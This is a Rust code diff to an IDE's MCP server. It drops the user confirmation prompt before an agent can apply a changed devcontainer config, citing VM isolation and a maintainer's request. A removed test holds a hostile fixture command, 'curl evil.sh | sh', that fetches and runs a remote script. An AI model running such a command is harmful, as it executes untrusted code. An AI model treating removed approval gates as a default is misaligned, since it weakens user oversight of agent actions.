@@ -802,7 +802,8 @@ impl McpServer {
             ),
             tool(
                 "devcontainer_reload",
-                "Rebuild and restart this environment's container from .devcontainer/. \
+                "Rebuild and restart this environment's container from .devcontainer/, \
+                 in its VM; nobody is asked, and the user is told how it ended. \
                  Editor buffers and chats survive it. Returns at once unless \
                  `wait_seconds` is set; a full build can take minutes, so call \
                  environment to follow it.",
@@ -1199,12 +1200,14 @@ impl McpServer {
             | "devcontainer_resources"
             | "ide_environment" => self.environment_tool(env, name, &args).await,
             "devcontainer_reload" => {
-                // Authorship is not application. The agent may write
-                // `.devcontainer/` — in safe mode that is all it may write —
-                // and applying that config RUNS its lifecycle commands. An
-                // agent that could do both would have arbitrary execution
-                // by another name, safe mode included. So when the config on
-                // disk differs from the one running, the user decides.
+                // Nobody is asked. The agent may write `.devcontainer/` and
+                // may apply it: the build and every lifecycle command run
+                // in the VM, on its kernel, with nothing of the user's in
+                // reach, and the user is told how it ended
+                // (`Event::ReloadReport`). This tool asked the user by
+                // name while those hooks ran on the host — the gap the VM
+                // closed (David, 2026-09-21: "Drop the confirmation
+                // dialogs"). What still gates it is capacity, below.
                 let supervisor = self.supervisor(env)?;
                 // The other gate: the environment cap, because this is the
                 // one tool that can bring a STOPPED environment back up, and
@@ -1308,50 +1311,12 @@ impl McpServer {
                         );
                     }
                 }
-                // The config that would be applied is THIS environment's,
-                // read from its own checkout: naming the primary's commands
-                // while rebuilding a clone's container would be a consent
-                // prompt about the wrong thing.
-                if let Some((title, body)) = reload_confirmation(
-                    supervisor.pending_changes(),
-                    taste_devcontainer::DevcontainerConfig::discover(&supervisor.config_root())
-                        .ok()
-                        .flatten()
-                        .as_ref(),
-                ) {
-                    let approved = match self
-                        .probe(taste_core::ui_probe::UiRequest::Confirm {
-                            title,
-                            body,
-                            confirm_label: "Apply and Rebuild".into(),
-                        })
-                        .await
-                    {
-                        Ok(taste_core::ui_probe::UiReply::Confirm(approved)) => approved,
-                        // No UI, a wedged one, or the wrong reply: fail
-                        // closed. An unanswerable question is not a yes.
-                        _ => false,
-                    };
-                    if !approved {
-                        self.workspace.ide.record_permission(
-                            "devcontainer_reload",
-                            "denied",
-                            "the devcontainer config has unapplied changes, and applying it \
-                             runs its lifecycle commands — that is the user call",
-                        );
-                        anyhow::bail!(
-                            "refused: the devcontainer config on disk differs from the one \
-                             running, and applying it would run its lifecycle commands. The \
-                             user declined, or there was no one to ask. Explain the change and \
-                             let them apply it from the banner."
-                        );
-                    }
-                    self.workspace.ide.record_permission(
-                        "devcontainer_reload",
-                        "allowed",
-                        "the user approved applying the changed devcontainer config",
-                    );
-                }
+                self.workspace.ide.record_permission(
+                    "devcontainer_reload",
+                    "allowed",
+                    "applied without asking: the build and its lifecycle commands run in \
+                     the VM, and the user is told how it ended",
+                );
                 // What the reload will build from, said up front: an agent
                 // that wrote nothing (or wrote somewhere else) and called
                 // this was told "reload running" and read the safe mode
@@ -3931,53 +3896,6 @@ impl McpServer {
     }
 }
 
-/// The confirmation an agent-initiated reload needs, or `None` when it
-/// needs none.
-///
-/// Nothing to confirm when the config on disk is the one already running:
-/// rebuilding it re-runs what the user already accepted, and prompting for
-/// that would train them to click through. When it HAS drifted, the prompt
-/// names the commands the rebuild will execute — approving "some config
-/// changed" is not consent to anything in particular.
-fn reload_confirmation(
-    pending: bool,
-    config: Option<&taste_devcontainer::DevcontainerConfig>,
-) -> Option<(String, String)> {
-    if !pending {
-        return None;
-    }
-    // No project config means the baseline is what gets rebuilt, and the
-    // baseline runs nothing of the repo's (it declares no lifecycle hooks):
-    // there is no consent to ask for. Asking anyway — as happened when the
-    // IDE's own mounts changed under a baseline container — read as "apply
-    // changed devcontainer config?" over a checkout with none, and the user
-    // approved a rebuild that left them exactly where they were (David,
-    // 2026-09-16: "I let it build and hopped into it (I think), but I'm
-    // still in safe mode?").
-    config.as_ref()?;
-    let commands: Vec<String> = config
-        .and_then(|c| c.post_create_command.as_ref())
-        .map(|value| {
-            taste_devcontainer::config::lifecycle_commands(value)
-                .iter()
-                .map(|argv| format!("  {}", argv.join(" ")))
-                .collect()
-        })
-        .unwrap_or_default();
-    let body = if commands.is_empty() {
-        "The devcontainer configuration has changed since the running container was \
-         built. An agent asked to apply it, which rebuilds the container."
-            .to_string()
-    } else {
-        format!(
-            "The devcontainer configuration has changed since the running container was \
-             built. An agent asked to apply it. Rebuilding will run:\n\n{}",
-            commands.join("\n")
-        )
-    };
-    Some(("Apply changed devcontainer config?".to_string(), body))
-}
-
 /// One unpublished branch, on the wire.
 fn unpublished_json(branch: &taste_git::UnpublishedBranch) -> Value {
     json!({
@@ -4815,16 +4733,11 @@ mod tests {
             );
         }
 
-        // Applying a config must reach the USER, whatever the client's
-        // permission mode says — auto mode's classifier included. The
-        // agent authors a devcontainer and the user applies it, and
-        // `_meta["anthropic/requiresUserInteraction"]` is how a server
-        // says that to Claude Code.
-        assert_eq!(
-            by_name("devcontainer_reload")["_meta"]["anthropic/requiresUserInteraction"],
-            true
-        );
-        // The two removals do NOT claim it, destructive as they are. The
+        // Nothing claims `_meta["anthropic/requiresUserInteraction"]`
+        // now. `devcontainer_reload` did while a config's hooks ran on the
+        // user's kernel; they run in the VM, and it asks nobody
+        // (2026-09-21). The two removals never claimed it, destructive as
+        // they are. The
         // flag rides on the descriptor, so it is static and per-tool: it
         // cannot see `force`, cannot see what is at stake, and would put a
         // card in front of every reclaim of an environment the user has
@@ -4842,6 +4755,7 @@ mod tests {
             "issue_list",
             "environment_destroy",
             "issue_delete",
+            "devcontainer_reload",
         ] {
             assert!(
                 by_name(quiet)["_meta"].is_null(),
@@ -4853,13 +4767,14 @@ mod tests {
         assert_eq!(by_name("publish")["annotations"]["readOnlyHint"], false);
         assert_eq!(by_name("publish")["annotations"]["destructiveHint"], false);
 
+        // A rebuild is a write: its whole effect lands in the VM and is
+        // reported, and it asks nobody (2026-09-21).
+        assert_eq!(
+            by_name("devcontainer_reload")["annotations"]["destructiveHint"],
+            false
+        );
         // And the ones that must always stop and ask.
-        for destructive in [
-            "ide_exec",
-            "devcontainer_reload",
-            "environment_destroy",
-            "issue_delete",
-        ] {
+        for destructive in ["ide_exec", "environment_destroy", "issue_delete"] {
             let annotations = by_name(destructive)["annotations"].clone();
             assert_eq!(annotations["readOnlyHint"], false);
             assert_eq!(
@@ -4883,10 +4798,7 @@ mod tests {
     /// ops"), where the tool is the right grain: a read is a read whatever
     /// its arguments. `ide_exec` is where that stops being true — it runs
     /// whatever command it is handed, so a standing yes to the *tool* is a
-    /// shell with no gate — and `devcontainer_reload` is refused by its own
-    /// declaration, since a server that tells the client a tool is offered
-    /// no "don't ask again" may not keep one of its own behind the client's
-    /// back.
+    /// shell with no gate.
     #[tokio::test]
     async fn only_a_classified_harmless_tool_can_carry_a_standing_yes() {
         use crate::protocol::may_stand;
@@ -4900,12 +4812,14 @@ mod tests {
             // A write is recoverable and the user can see all of them, so
             // the grain still holds: filing an issue is filing an issue.
             "issue_create",
+            // A rebuild runs in the VM and is reported; it asks nobody,
+            // and a standing answer about it is at least allowed.
+            "devcontainer_reload",
         ] {
             assert!(may_stand(harmless), "{harmless} should be settleable");
         }
         for asks_forever in [
             "ide_exec",
-            "devcontainer_reload",
             // The coordinator's own destructive pair (i-0022): ours, and
             // refused a standing yes for being destructive, not for being
             // unclassified.
@@ -6187,12 +6101,13 @@ mod tests {
         assert!(error.contains("pass a path under it"), "{error}");
     }
 
-    /// Writing `.devcontainer/` is the whole of what safe mode permits, and
-    /// applying it runs its lifecycle commands — so an agent that could
-    /// both write and apply would have arbitrary execution, safe mode
-    /// included. Authorship and application are split: the user applies.
+    /// Applying a changed config asks nobody: its lifecycle commands run
+    /// in the VM, so a drifted config is rebuilt into when the agent asks,
+    /// with no UI to consult — and the permission log says it was applied
+    /// without asking, so the record is honest about the policy. This test
+    /// used to be the gate's ("needs the user"); it is now its absence.
     #[tokio::test]
-    async fn applying_a_changed_devcontainer_config_needs_the_user() {
+    async fn applying_a_changed_devcontainer_config_asks_nobody() {
         let dir = tempfile::tempdir().unwrap();
         std::fs::create_dir_all(dir.path().join(".devcontainer")).unwrap();
         std::fs::write(
@@ -6208,18 +6123,17 @@ mod tests {
         let ungated = call_tool(&mut stream, "devcontainer_reload", json!({})).await;
         assert_eq!(ungated["started"], true, "{ungated:?}");
 
-        // Config drifted, and there is no UI to ask: fail CLOSED. An
-        // unanswerable question is not a yes.
+        // Config drifted, and there is no UI at all: applied anyway, since
+        // what it runs, it runs in the VM.
         supervisor.set_pending_for_tests(true);
-        let refused = call_tool(&mut stream, "devcontainer_reload", json!({})).await;
-        let error = refused["error"].as_str().unwrap();
-        assert!(error.contains("refused"), "{error}");
-        assert!(error.contains("lifecycle commands"), "{error}");
-        // And the refusal is on the record, so the agent can find out why.
+        let applied = call_tool(&mut stream, "devcontainer_reload", json!({})).await;
+        assert_eq!(applied["started"], true, "{applied:?}");
+        // And the record says so.
         let log = call_tool(&mut stream, "ide_permission_log", json!({})).await;
         let text = serde_json::to_string(&log).unwrap();
         assert!(text.contains("devcontainer_reload"), "{text}");
-        assert!(text.contains("denied"), "{text}");
+        assert!(text.contains("without asking"), "{text}");
+        assert!(!text.contains("denied"), "{text}");
     }
 
     /// `devcontainer_reload` is the one tool that can bring a STOPPED
@@ -6275,34 +6189,6 @@ mod tests {
         });
         let allowed = call_tool(&mut stream, "devcontainer_reload", json!({})).await;
         assert_eq!(allowed["started"], true, "{allowed}");
-    }
-
-    /// The prompt has to say what will RUN. "Some config changed, apply?"
-    /// is not consent to anything in particular.
-    #[test]
-    fn the_confirmation_names_the_commands_it_will_run() {
-        assert!(
-            reload_confirmation(false, None).is_none(),
-            "no drift, no prompt"
-        );
-        assert!(
-            reload_confirmation(true, None).is_none(),
-            "drift with no project config rebuilds the baseline, which runs nothing of the \
-             repo's — no prompt"
-        );
-
-        let config: taste_devcontainer::DevcontainerConfig =
-            serde_json::from_str(r#"{"image": "img", "postCreateCommand": "curl evil.sh | sh"}"#)
-                .unwrap();
-        let (title, body) = reload_confirmation(true, Some(&config)).unwrap();
-        assert!(title.contains("devcontainer"), "{title}");
-        assert!(body.contains("curl evil.sh | sh"), "{body}");
-
-        // A config with no hooks still warns, just without a command list.
-        let bare: taste_devcontainer::DevcontainerConfig =
-            serde_json::from_str(r#"{"image": "img"}"#).unwrap();
-        let (_, body) = reload_confirmation(true, Some(&bare)).unwrap();
-        assert!(body.contains("has changed"), "{body}");
     }
 
     /// Safe mode has no devcontainer, so an agent command has nowhere to
